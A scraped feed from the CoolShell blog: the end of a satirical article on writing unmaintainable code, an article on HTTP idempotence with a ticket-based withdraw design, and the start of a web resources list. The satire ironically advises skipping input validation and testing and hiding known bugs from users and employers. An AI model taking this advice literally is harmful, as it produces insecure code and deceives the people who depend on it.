<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#ifndef DONE
#ifdef TWICE
// put stuff here to declare 3rd time around
void g(char* str);
#define DONE
#else // TWICE
#ifdef ONCE
// put stuff here to declare 2nd time around&lt;
void g(void* str);
#define TWICE
#else // ONCE
// put stuff here to declare 1st time around
void g(std::string str);
#define ONCE
#endif // ONCE
#endif // TWICE
#endif // DONE</pre>
<h4>
<span class="ez-toc-section" id="%E6%96%87%E6%A1%A3%E5%92%8C%E6%B3%A8%E9%87%8A"></span>文档和注释<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<strong>在注释中撒谎</strong>。你不用真的去撒谎，只需在改代码的时候不要更新注释就可以了。</li>
<li>
<strong>注释明显的东西</strong>。比如：/* add 1 to i */。（参看本站的“<a title="五种应该避免的代码注释" href="https://coolshell.cn/articles/2746.html" target="_blank">五种应该避免的注释</a>”）</li>
<li>
<strong>只注释是什么，而不是为什么</strong>。</li>
<li>
<strong>不要注释秘密</strong>。如果你开发一个航班系统，请你一定要保证每有一个新的航班被加入，就得要修改25个以上的位置的程序。千万别把这个事写在文档中。</li>
<li>
<strong>注重细节</strong>。当你设计一个很复杂的算法的时候，你一定要把所有的详细细设计都写下来，没有100页不能罢休，段落要有5级以上，段落编号要有500个以上，例如：1.2.4.6.3.13 – Display all impacts for activity where selected mitigations can apply (short pseudocode omitted). 这样，当你写代码的时候，你就可以让你的代码和文档一致，如：Act1_2_4_6_3_13()</li>
<li>
<strong>千万不要注释度衡单位</strong>。比如时间用的是秒还是毫秒，尺寸用的是像素还是英寸，大小是MB还是KB。等等。另外，在你的代码里，你可以混用不同的度衡单位，但也不要注释。</li>
<li>
<strong>Gotchas</strong>。陷阱，千万不要注释代码中的陷阱。</li>
<li>
<strong>在注释和文档中发泄不满</strong>。（参看本站的“<a title="五种应该避免的代码注释" href="https://coolshell.cn/articles/2746.html" target="_blank">五种应该避免的注释</a>”）</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1"></span>程序设计<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<strong>Java Casts</strong>。Java的类型转型是天赐之物。每一次当你从Collection里取到一个object的时候，你都需要把其转回原来的类型。因些，这些转型操作会出现在N多的地方。如果你改变了类型，那么你不一定能改变所有的地方。而编译器可能能检查到，也可能检查不到。</li>
<li>
<strong>利用Java的冗余</strong>。比如：Bubblegum b = new Bubblegom(); 和 swimmer = swimner + 1; 注意变量间的细微差别。</li>
<li>
<strong>从不验证</strong>。从不验证输入的数据，从不验证函数的返回值。这样做可以向大家展示你是多么的信任公司的设备和其它程序员。</li>
<li>
<strong>不要封装</strong>。调用者需要知道被调用的所有的细节。</li>
<li>
<strong>克隆和拷贝</strong>。为了效率，你要学会使用copy + paste。你几乎都不用理解别人的代码，你就可以高效地编程了。（陈皓注：Copy + Paste出来的代码bug多得不能再多）</li>
<li>
<strong>巨大的listener</strong>。写一个listener，然后让你的所有的button类都使用这个listener，这样你可以在这个listener中整出一大堆if…else…语句，相当的刺激。</li>
<li>
<strong>使用三维数组</strong>。如果你觉得三维还不足够，你可以试试四维。</li>
<li>
<strong>混用</strong>。同时使用类的get/set方法和直接访问那个public变量。这样做的好处是可以极大的挫败维护人员。</li>
<li>
<strong>包装，包装，包装</strong>。把你所有的API都包装上6到8遍，包装深度多达4层以上。然后包装出相似的功能。</li>
<li>
<strong>没有秘密</strong>。把所有的成员都声明成public的。这样，你以后就很难限制其被人使用，而且这样可以和别的代码造成更多的耦合度，可以让你的代码存活得更久。</li>
<li>
<strong>排列和阻碍</strong>。把drawRectangle(height, width) 改成 drawRectangle(width, height)，等release了几个版本后，再把其改回去。这样维护程序的程序员们将不能很快地明白哪一个是对的。</li>
<li>
<strong>把变量改在名字上</strong>。例如，把setAlignment(int alignment)改成，setLeftAlignment, setRightAlignment, setCenterAlignment。</li>
<li>
<strong>Packratting</strong>。保留你所有的没有使用的和陈旧的变量，方法和代码。</li>
<li>
<strong>That’s Fina</strong>l。Final你所有的子结点的类，这样，当你做完这个项目后，没有人可以通过继承来扩展你的类。java.lang.String不也是这样吗？</li>
<li>
<strong>避免使用接口</strong>。在java中，BS接口，在C++中BS使用虚函数。</li>
<li>
<strong>避免使用layout</strong>。这样就使得我们只能使用绝对坐标。如果你的老大强制你使用layout，你可以考虑使用GridBagLayout，然后把grid坐标hard code.</li>
<li>
<strong>环境变量</strong>。如果你的代码需要使用环境变量。(getenv() – C++ / System.getProperty() – Java )，那么，你应该把你的类的成员的初始化使用环境变量，而不是构造函数。</li>
<li>
<strong>使用Magic numbe</strong>r。参看《<a title="Linux 2.6.39-rc3的一个插曲" href="https://coolshell.cn/articles/4576.html" target="_blank">Linux一个插曲</a>》。</li>
<li>
<strong>使用全局变量</strong>。1）把全局变量的初始化放在不同的函数中，就算这个函数和这个变量没有任何关系，这样能够让我们的维护人员就像做侦探工作一样。2）使用全局变量可以让你的函数的参数变得少一些。</li>
<li>
<strong>配置文件</strong>。配置文件主要用于一些参数的初始化。在编程中，我们可以让配置文件中的参数名和实际程序中的名字不一样。</li>
<li>
<strong>膨胀你的类</strong>。让你的类尽可能地拥有各种臃肿和晦涩的方法。比如，你的类只实现一种可能性，但是你要提供所有可能性的方法。不要定义其它的类，把所有的功能都放在一个类中。</li>
<li>
<strong>使用子类</strong>。面向对象是写出无法维护代码的天赐之物。如果你有一个类有十个成为（变量和方法）你可以考虑写10个层次的继承，然后把这十个属性分别放在这十个层次中。如果可能的话，把这十个类分别放在十个不同的文件中。</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E6%B7%B7%E4%B9%B1%E4%BD%A0%E7%9A%84%E4%BB%A3%E7%A0%81"></span>混乱你的代码<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<strong>使用XML</strong>。XML的强大是无人能及的。使用XML你可以把本来只要10行的代码变成100行。而且，还要逼着别人也有XML。（参看，<a title="信XML，得永生！" href="https://coolshell.cn/articles/2504.html" target="_blank">信XML得永生</a>，<a title="信XML，得自信" href="https://coolshell.cn/articles/3498.html" target="_blank">信XML得自信</a>）</li>
<li>
<strong>混乱C代码</strong>。在《<a title="如何加密/混乱C源代码" href="https://coolshell.cn/articles/933.html" target="_blank">如何加密源代码</a>》中已经说过一些方法了，这里再补充一些。</li>
<li>
<strong>使用不同的进制</strong>。比如：10 和010不是一样的。再比如：array = new int[]{   111,   120,   013,   121,};</li>
<li>
<strong>尽量使用void*</strong>。然后把其转成各种类型</li>
<li>
<strong>使用隐式的转型</strong>。C++的构造函数可以让你神不知鬼不觉得完成转型。</li>
<li>
<strong>分解条件表达式</strong>。如：把 a==100分解成，a&gt;99 &amp;&amp; a&lt;101</li>
<li>
<strong>学会利用分号</strong>。如：if ( a );else;{   int d;   d = c;}</li>
<li>
<strong>间接转型</strong>。如：把double转string，写成new Double(d).toString() 而不是 Double.toString(d)</li>
<li>
<strong>大量使用嵌套</strong>。一个NB的程序员可以在一行代码上使用超过10层的小括号（），或是在一个函数里使用超过20层的语句嵌套{}，把嵌套的if else 转成 [? :] 也是一件很NB的事。</li>
<li>
<strong>使用C的变种数组</strong>。myArray[i] 可以变成*(myArray + i) 也可以变成 *(i + myArray) 其等价于 i[myArray]。再看一个函数调用的示例，函数声明：int myfunc(int q, int p) { return p%q; } 函数调用myfunc(6291, 8)[Array];</li>
<li>
<strong>长代码行</strong>。一行的代码越长越好。这样别人阅读时就需要来来回回的</li>
<li>
<strong>不要较早的return</strong>。不要使用goto，不要使用break，这样，你就需要至少5层以上的if-else来处理错误。</li>
<li>
<strong>不要使用{}</strong>。不要在if else使用{}，尤其是在你重量地使用if-else嵌套时，你甚至可以在其中乱缩进代码，这样一来，就算是最有经验的程序员也会踩上陷阱。</li>
<li>
<strong>使用宏定义</strong>。宏定义绝对是混乱C/C++代码的最佳利器。参看 <a title="老手是这样教新手编程的" href="https://coolshell.cn/articles/2420.html" target="_blank">老手是这样教新手编程的</a>。</li>
<li>
<strong>琐碎的封装</strong>。比较封装一个bool类，类里面什么都做，就是一个bool.</li>
<li>
<strong>循环</strong>。千万不可用for(int i=0; i&lt;n; i++)使用while代替for，交换n和i，把&lt;改成&lt;=，使用 i–调整步伐 。</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E6%B5%8B%E8%AF%95"></span>测试<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<strong>从不测试</strong>。千万不要测试任何的出错处理，从来也不检测系统调用的返回值。</li>
<li>
<strong>永远不做性能测试</strong>。如果不够快就告诉用户换一个更快的机器。如果你一做测试，那么就可能会要改你的算法，甚至重设计，重新架构。</li>
<li>
<strong>不要写测试案例</strong>。不要做什么代码覆盖率测试，自动化测试。</li>
<li>
<strong>测试是懦夫行为</strong>。一个勇敢的程序员是根本不需要这一步的。太多的程序太害怕他们的老板，害怕失去工作，害怕用户抱怨，甚至被起诉。这种担心害怕直接影响了生产力。如果你对你的代码有强大的信心，那还要什么测试呢？真正的程序员是不需要测试自己的代码的。</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%85%B6%E5%AE%83"></span>其它<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<strong>你的老板什么都知道</strong>。无论你的老板有多SB，你都要严格地遵照他的旨意办事，这样一来，你会学到更多的知识如何写出无法维护的代码来的。</li>
<li>
<strong>颠覆Help Desk</strong>。你要确保你那满是bug的程序永远不要被维护团队知道。当用户打电话和写邮件给你的时候，你就不要理会，就算要理会，让用户重做系统或是告诉用户其帐号有问题，是标准的回答。</li>
<li>
<strong>闭嘴</strong>。对于一些像y2k这样的大bug，你要学会守口如瓶，不要告诉任何人，包括你的亲人好友以及公司的同事和管理层，这样当到那一天的时候，你就可以用这个bug挣钱了。</li>
<li>
<strong>忽悠</strong>。你会学会忽悠，就算你的代码写得很烂，你也要为其挂上GoF设计模式的标签，就算你的项目做得再烂，你也要为其挂上敏捷的标签，只有学会<a title="再谈敏捷和ThoughtWorks中国咨询师" href="https://coolshell.cn/articles/3745.html" target="_blank">像中国Thoughtworks的咨询师那样去忽悠</a>，你才能学会更炫更酷的方法，让整个团队和公司，甚至整个业界都开始躁动，这样才能真正为难维护的代码铺平道路。</li>
</ul>
<p>这个文档中还有很多很多，实在是太TMD强大了，大家自己去看看吧。有精力有能力的朋友不妨把其翻译成中文。</p>
<p>总之，我们的口号是——</p>
<h4 style="text-align: center;">
<span class="ez-toc-section" id="Write_Everywhere_Read_Nowhere"></span>Write Everywhere, Read Nowhere<span class="ez-toc-section-end"></span>
</h4>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18024.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_title">API设计原则 – Qt官网的设计实践总结</a>
</li>
<li>
<a href="https://coolshell.cn/articles/8088.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8088.html" class="wp_rp_title">对技术的态度</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4990.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4990.html" class="wp_rp_title">程序员技术练级攻略</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4102.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4102.html" class="wp_rp_title">如何学好C语言</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1992.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1992.html" class="wp_rp_title">程序员眼中的编程语言</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4758" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="89fa1f61c7">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>63</strong> 人打了分，平均分： <strong>4.46</strong> )<br><span class="post-ratings-text" id="ratings_4758_text"></span><meta itemprop="name" content="如何写出无法维护的代码">
<meta itemprop="headline" content="如何写出无法维护的代码">
<meta itemprop="description" content="酷壳里有很多我觉得很不错的文章，但是访问量最大的却是那篇《6个变态的Hello World》，和它能在本站右边栏“全站热门”中出现的还有“如何加密源代码”，以及编程真难啊等这样的文章。可见本站的读者们的偏好，我也相信你们都是“身怀绝技”的程序员。所以，今天给大家推荐这篇文章，相信一定能触动大家的兴奋点。

这篇文章的原文在这里（http://mindprod.com/jgloss/unmain...">
<meta itemprop="datePublished" content="2011-06-03T08:52:42+08:00">
<meta itemprop="dateModified" content="2011-09-08T15:28:14+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4758.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4758.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.46">
<meta itemprop="ratingCount" content="63">
</div>
</div>
<div id="post-ratings-4758-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-06-03T08:52:42+08:00</pubDate>
<guid>https://coolshell.cn/articles/4758.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ HTTP幂等性概念和应用 ]]></title>
<link>https://coolshell.cn/articles/4787.html</link>
<content><![CDATA[ 
<p><strong>[ 感谢 <a href="https://www.cnblogs.com/weidagang2046/" target="_blank">Todd 同学</a>投递本文 ]</strong></p>
<p>基于HTTP协议的Web API是时下最为流行的一种分布式服务提供方式。无论是在大型互联网应用还是企业级架构中，我们都见到了越来越多的SOA或RESTful的Web API。为什么Web API如此流行呢？我认为很大程度上应归功于简单有效的HTTP协议。HTTP协议是一种分布式的面向资源的网络应用层协议，无论是服务器端提供Web服务，还是客户端消费Web服务都非常简单。再加上浏览器、Javascript、AJAX、JSON以及HTML5等技术和工具的发展，互联网应用架构设计表现出了从传统的PHP、JSP、ASP.NET等服务器端动态网页向Web API + RIA（富互联网应用）过渡的趋势。Web API专注于提供业务服务，RIA专注于用户界面和交互设计，从此两个领域的分工更加明晰。在这种趋势下，Web API设计将成为服务器端程序员的必修课。然而，正如简单的Java语言并不意味着高质量的Java程序，简单的HTTP协议也不意味着高质量的Web API。要想设计出高质量的Web API，还需要深入理解分布式系统及HTTP协议的特性。</p>
<p><strong> </strong></p>
<p><strong> </strong></p>
<p><strong>幂等性定义</strong></p>
<p>本文所要探讨的正是HTTP协议涉及到的一种重要性质：幂等性(Idempotence)。在HTTP/1.1规范中幂等性的定义是：</p>
<blockquote><p><em><span style="color: #800040;">Methods can also have the property of “idempotence” in that (aside from error or expiration issues) the side-effects of N &gt; 0 identical requests is the same as for a single request.</span></em></p></blockquote>
<p>从定义上看，HTTP方法的幂等性是指一次和多次请求某一个资源应该具有同样的副作用。幂等性属于语义范畴，正如编译器只能帮助检查语法错误一样，HTTP规范也没有办法通过消息格式等语法手段来定义它，这可能是它不太受到重视的原因之一。但实际上，幂等性是分布式系统设计中十分重要的概念，而HTTP的分布式本质也决定了它在HTTP中具有重要地位。</p>
<p><span id="more-4787"></span></p>
<p><strong> </strong></p>
<p><strong>分布式事务 vs 幂等设计</strong></p>
<p>为什么需要幂等性呢？我们先从一个例子说起，假设有一个从账户取钱的远程API（可以是HTTP的，也可以不是），我们暂时用类函数的方式记为</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">bool withdraw(account_id, amount); </code></p>
<p>withdraw的语义是从account_id对应的账户中扣除amount数额的钱；如果扣除成功则返回true，账户余额减少amount；如果扣除失败则返回false，账户余额不变。值得注意的是：和本地环境相比，我们不能轻易假设分布式环境的可靠性。一种典型的情况是withdraw请求已经被服务器端正确处理，但服务器端的返回结果由于网络等原因被掉丢了，导致客户端无法得知处理结果。如果是在网页上，一些不恰当的设计可能会使用户认为上一次操作失败了，然后刷新页面，这就导致了withdraw被调用两次，账户也被多扣了一次钱。如图1所示：</p>
<p style="text-align: center;"><a href="https://images.cnblogs.com/cnblogs_com/weidagang2046/201106/201106042051027575.png"><img alt="image placeholder" ></a></p>
<p style="text-align: center;"><a href="https://images.cnblogs.com/cnblogs_com/weidagang2046/201106/201106042051027575.png"></a>图1</p>
<p>这个问题的解决方案一是采用分布式事务，通过引入支持分布式事务的中间件来保证withdraw功能的事务性。分布式事务的优点是对于调用者很简单，复杂性都交给了中间件来管理。缺点则是一方面架构太重量级，容易被绑在特定的中间件上，不利于异构系统的集成；另一方面分布式事务虽然能保证事务的ACID性质，而但却无法提供性能和可用性的保证。</p>
<p>另一种更轻量级的解决方案是幂等设计。上面的withdraw显然不满足幂等性，但我们可以一些技巧将它变成幂等的，比如：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int create_ticket();

bool idempotent_withdraw(ticket_id, account_id, amount);</pre>
<p>create_ticket的语义是获取一个服务器端生成的唯一的处理号ticket_id，它将用于标识后续的操作。idempotent_withdraw和withdraw的区别在于关联了一个ticket_id，一个ticket_id表示的操作至多只会被处理一次，每次调用都将返回第一次调用时的处理结果。这样，idempotent_withdraw就符合幂等性了，客户端就可以放心地多次调用。</p>
<p>基于幂等性的解决方案中一个完整的取钱流程被分解成了两个步骤：1.调用create_ticket()获取ticket_id；2.调用idempotent_withdraw(ticket_id, account_id, amount)。虽然create_ticket不是幂等的，但在这种设计下，它对系统状态的影响可以忽略，加上idempotent_withdraw是幂等的，所以任何一步由于网络等原因失败或超时，客户端都可以重试，直到获得结果。如图2所示：</p>
<p><a href="https://images.cnblogs.com/cnblogs_com/weidagang2046/201106/201106042051059820.png"><img alt="image placeholder" ></a></p>
<p style="text-align: center;">图2</p>
<p><strong> </strong></p>
<p>和分布式事务相比，幂等设计的优势在于它的轻量级，容易适应异构环境，以及性能和可用性方面。在某些性能要求比较高的应用，幂等设计往往是唯一的选择。</p>
<p><strong> </strong></p>
<p><strong>HTTP的幂等性</strong></p>
<p>HTTP协议本身是一种面向资源的应用层协议，但对HTTP协议的使用实际上存在着两种不同的方式：一种是RESTful的，它把HTTP当成应用层协议，比较忠实地遵守了HTTP协议的各种规定；另一种是SOA的，它并没有完全把HTTP当成应用层协议，而是把HTTP协议作为了传输层协议，然后在HTTP之上建立了自己的应用层协议。本文所讨论的HTTP幂等性主要针对RESTful风格的，不过正如上一节所看到的那样，幂等性并不属于特点的协议，它是分布式系统的一种特性；所以，不论是SOA还是RESTful的Web API设计都应该考虑幂等性。下面将介绍HTTP GET、DELETE、PUT、POST四种主要方法的语义和幂等性。</p>
<p>HTTP GET方法用于获取资源，不应有副作用，所以是幂等的。比如：GET http://www.bank.com/account/123456，不会改变资源的状态，不论调用一次还是N次都没有副作用。请注意，这里强调的是一次和N次具有相同的副作用，而不是每次GET的结果相同。GET http://www.news.com/latest-news这个HTTP请求可能会每次得到不同的结果，但它本身并没有产生任何副作用，因而是满足幂等性的。</p>
<p>HTTP DELETE方法用于删除资源，有副作用，但它应该满足幂等性。比如：DELETE http://www.forum.com/article/4231，调用一次和N次对系统产生的副作用是相同的，即删掉id为4231的帖子；因此，调用者可以多次调用或刷新页面而不必担心引入错误。</p>
<p>比较容易混淆的是HTTP POST和PUT。POST和PUT的区别容易被简单地误认为“POST表示创建资源，PUT表示更新资源”；而实际上，二者均可用于创建资源，更为本质的差别是在幂等性方面。在HTTP规范中对POST和PUT是这样定义的：</p>
<blockquote>
<p><span style="color: #800040;"><em>The POST method is used to request that the origin server accept the entity enclosed in the request as a new subordinate of the resource identified by the Request-URI in the Request-Line. …… </em><em>If a resource has been created on the origin server, the response SHOULD be 201 (Created) and contain an entity which describes the status of the request and refers to the new resource, and a Location header.</em></span></p>
<p><em><span style="color: #800040;">The PUT method requests that the enclosed entity be stored under the supplied Request-URI. If the Request-URI refers to an already existing resource, the enclosed entity SHOULD be considered as a modified version of the one residing on the origin server. If the Request-URI does not point to an existing resource, and that URI is capable of being defined as a new resource by the requesting user agent, the origin server can create the resource with that URI.</span></em></p>
</blockquote>
<p>POST所对应的URI并非创建的资源本身，而是资源的接收者。比如：POST http://www.forum.com/articles的语义是在http://www.forum.com/articles下创建一篇帖子，HTTP响应中应包含帖子的创建状态以及帖子的URI。两次相同的POST请求会在服务器端创建两份资源，它们具有不同的URI；所以，POST方法不具备幂等性。</p>
<p>而PUT所对应的URI是要创建或更新的资源本身。比如：PUT http://www.forum/articles/4231的语义是创建或更新ID为4231的帖子。对同一URI进行多次PUT的副作用和一次PUT是相同的；因此，PUT方法具有幂等性。</p>
<p>在介绍了几种操作的语义和幂等性之后，我们来看看如何通过Web API的形式实现前面所提到的取款功能。很简单，用POST /tickets来实现create_ticket；用PUT /accounts/account_id/ticket_id&amp;amount=xxx来实现idempotent_withdraw。值得注意的是严格来讲amount参数不应该作为URI的一部分，真正的URI应该是/accounts/account_id/ticket_id，而amount应该放在请求的body中。这种模式可以应用于很多场合，比如：论坛网站中防止意外的重复发帖。</p>
<p><strong> </strong></p>
<p><strong>总结</strong></p>
<p>上面简单介绍了幂等性的概念，用幂等设计取代分布式事务的方法，以及HTTP主要方法的语义和幂等性特征。其实，如果要追根溯源，幂等性是数学中的一个概念，表达的是N次变换与1次变换的结果相同，有兴趣的读者可以从<a href="https://en.wikipedia.org/wiki/Idempotence">Wikipedia</a>上进一步了解。</p>
<p><strong> </strong></p>
<p><strong>参考</strong></p>
<p><a href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html">RFC 2616, Hypertext Transfer Protocol — HTTP/1.1, Method Definitions</a></p>
<p><a href="http://devhawk.net/2007/11/09/the-importance-of-idempotence/">The Importance of Idempotence</a></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/19840.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19840.html" class="wp_rp_title">HTTP的前世今生</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18094.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18094.html" class="wp_rp_title">如何免费的让网站启用HTTPS</a>
</li>
<li>
<a href="https://coolshell.cn/articles/8767.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8767.html" class="wp_rp_title">Web工程师的工具箱</a>
</li>
<li>
<a href="https://coolshell.cn/articles/2367.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/2367.html" class="wp_rp_title">谷歌Chrome取消”http://”</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1480.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1480.html" class="wp_rp_title">非常简单的Python HTTP服务</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4787" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="025965fdc8">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>18</strong> 人打了分，平均分： <strong>3.78</strong> )<br><span class="post-ratings-text" id="ratings_4787_text"></span><meta itemprop="name" content="HTTP幂等性概念和应用">
<meta itemprop="headline" content="HTTP幂等性概念和应用">
<meta itemprop="description" content="[ 感谢 Todd 同学投递本文 ]

基于HTTP协议的Web API是时下最为流行的一种分布式服务提供方式。无论是在大型互联网应用还是企业级架构中，我们都见到了越来越多的SOA或RESTful的Web API。为什么Web API如此流行呢？我认为很大程度上应归功于简单有效的HTTP协议。HTTP协议是一种分布式的面向资源的网络应用层协议，无论是服务器端提供Web服务，还是客户端消费Web...">
<meta itemprop="datePublished" content="2011-06-07T08:49:01+08:00">
<meta itemprop="dateModified" content="2011-06-04T22:58:46+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4787.html">
<meta itemprop="author" content="Todd">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4787.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.78">
<meta itemprop="ratingCount" content="18">
</div>
</div>
<div id="post-ratings-4787-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-06-07T08:49:01+08:00</pubDate>
<guid>https://coolshell.cn/articles/4787.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 开源中最好的Web开发的资源 ]]></title>
<link>https://coolshell.cn/articles/4795.html</link>
<content><![CDATA[ 
<p>文章来源：<a title="Best “must know” open sources to build the new Web" href="http://www.b2bweb.fr/molokoloco/best-must-know-ressources-for-building-the-new-web-%E2%98%85/" target="_blank">Best “must know” open sources to build the new Web</a>。个人感觉这个收集贴收集成相当的全。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%AD%A6%E4%B9%A0HTML_5%E7%BC%96%E7%A8%8B%E5%92%8C%E8%AE%BE%E8%AE%A1" title="学习HTML 5编程和设计">学习HTML 5编程和设计</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E7%9A%84%E8%BD%AF%E4%BB%B6" title="服务器端的软件">服务器端的软件</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#PHP_%E6%A1%86%E6%9E%B6%E5%92%8C%E5%B7%A5%E5%85%B7" title="PHP 框架和工具">PHP 框架和工具</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E6%95%B0%E6%8D%AE%E5%BA%93" title="数据库">数据库</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#API_%E5%92%8C_%E5%9C%A8%E7%BA%BF%E6%95%B0%E6%8D%AE" title="API 和 在线数据">API 和 在线数据</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E5%9C%A8%E7%BA%BF%E4%BB%A3%E7%A0%81%E5%92%8C%E5%AA%92%E4%BD%93%E7%BC%96%E8%BE%91%E5%99%A8" title="在线代码和媒体编辑器">在线代码和媒体编辑器</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E4%BB%A3%E7%A0%81%E8%B5%84%E6%BA%90%E5%92%8C%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6" title="代码资源和版本控制">代码资源和版本控制</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#JavaScript_%E6%A1%8C%E9%9D%A2%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6" title="JavaScript 桌面应用框架">JavaScript 桌面应用框架</a></li>
